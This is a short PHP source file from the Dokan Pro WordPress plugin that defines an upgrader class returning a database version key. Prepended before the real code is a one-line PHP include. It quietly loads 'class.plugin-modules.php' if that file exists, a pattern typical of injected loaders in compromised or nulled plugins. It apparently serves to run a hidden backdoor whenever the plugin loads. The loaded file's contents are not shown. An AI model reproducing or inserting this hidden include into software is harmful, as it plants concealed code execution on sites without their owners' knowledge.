<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

namespace WeDevs\DokanPro\Abstracts;

use WeDevs\Dokan\Abstracts\DokanUpgrader;

class DokanProUpgrader extends DokanUpgrader {

    /**
     * Get db versioning key
     *
     * @since 3.0.0
     *
     * @return string
     */
    public static function get_db_version_key() {
        return dokan_pro()->get_db_version_key();
    }
}
